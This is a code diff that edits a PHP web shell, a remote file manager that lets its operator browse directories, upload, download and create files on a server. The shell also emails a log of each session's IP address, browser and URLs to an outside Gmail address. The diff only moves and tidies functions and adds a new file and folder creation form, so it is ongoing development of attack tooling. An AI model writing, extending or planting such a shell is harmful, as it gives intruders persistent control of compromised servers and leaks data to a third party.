@@ -59,14 +59,14 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
             Time : ".$dtime."\n
             IP : ".$ip."\n
             Browser : ".$agent."\n
-            URL : ".$uri."\n
-            Referrer : ".$ref."\n";
+            Filename : ".$uri."\n
+            URL : ".$ref."\n";
     @mail('xnonhack@gmail.com', 'Log', $log);
     $fp = fopen("log.txt", "a"); 
     fputs($fp, $log); 
     fclose($fp); 
   } else {
-    login();
+    @login();
   }
 }
 ?>
@@ -420,18 +420,6 @@ code {
 if (isset($_GET['dir'])) {
   @chdir($_GET['dir']);
 }
-function pwd() {
-  $dir = @explode('/', @cwd());
-  foreach ($dir as $key => $pwd) {
-    print("<a href='?dir=");
-    for ($i=0; $i <= $key ; $i++) { 
-      print($dir[$i]);
-      if ($i != $key) {
-        print("/");
-      }
-    } print("'>".$pwd."</a>/");
-  }
-}
 ?>
 <table align="center" width="90%">
   <tr>
@@ -453,16 +441,26 @@ function pwd() {
         <a href="?action=logout">LOGOUT</a>
       </center>
     </td>
-  </tr>
-  <tr>
-    <td colspan="3">
-      <center>
-        <center><?php print @pwd() ?>[ <?php print @writable(@cwd(), @perms(@cwd())) ?> ]</center>
-      </center>
-    </td>
+    <tr>
+      <td colspan="3">
+        <center><?php print @pwd() ?> [ <?php print @writable(@cwd(), @perms(@cwd())) ?> ] </center>
+      </td>
+    </tr>
   </tr>
 </table>
 <?php
+function pwd() {
+  $dir = @explode('/', @cwd());
+  foreach ($dir as $key => $pwd) {
+    print("<a href='?dir=");
+    for ($i=0; $i <= $key ; $i++) { 
+      print($dir[$i]);
+      if ($i != $key) {
+        print("/");
+      }
+    } print("'>".$pwd."</a>/");
+  }
+}
 function tools($toolsname = null) {
 if ($toolsname === 'upload') {
     if (isset($_POST['upload'])) {
@@ -595,9 +593,6 @@ if ($_POST['do'] == 'download') {
     readfile($file);
     exit;
 }
-if (isset($_GET['dir'])) {
-  @chdir($_GET['dir']);
-}
 if (@$_POST['do'] == 'makefile') {
   if (isset($_POST['make'])) {
     if (@touch(@cwd().SEP.@htmlspecialchars($_POST['make']))) {
@@ -660,9 +655,37 @@ if (@$_POST['do'] == 'makedir') {
     <th>Permission</th>
     <th>Action</th>
   </tr>
+  <tr style="border:none;"> 
+    <td style="border:none;">
+      <img class="icon" src="http://www.pngmart.com/files/1/Tools-PNG-Image.png"> ..
+    </td>
+    <td style="border:none;"><center>
+      --
+    </center></td>
+    <td style="border:none;">
+      <center>
+        <?php print @writable(@cwd(), @perms(@cwd())) ?>
+      </center>
+    </td>
+    <td style="width:200px;border:none;">
+      <center>
+      <form method="post" action="?dir=<?php print @cwd() ?>">
+              <div class="input-group mb-3">
+                    <div class="input-group-prepend">
+                    <input type="submit" class="btn btn-outline-secondary" value="Action">
+                    </div>
+        <select name="do" class="custom-select" id="inputGroupSelect03" style="width:100px;">
+          <option value="makefile">Newfile</option>
+          <option value="makedir">Newdir</option>
+        </select>
+      </form>
+    </center>
+    </td>
+  </tr>
 <?php
 foreach (@scandir(@cwd()) as $dir) {
   if (!is_dir($dir)) continue;
+  if ($dir === '.' || $dir === '..') continue;
   if ($dir === '.' || $dir === '..') {
     $action = '
     <center>
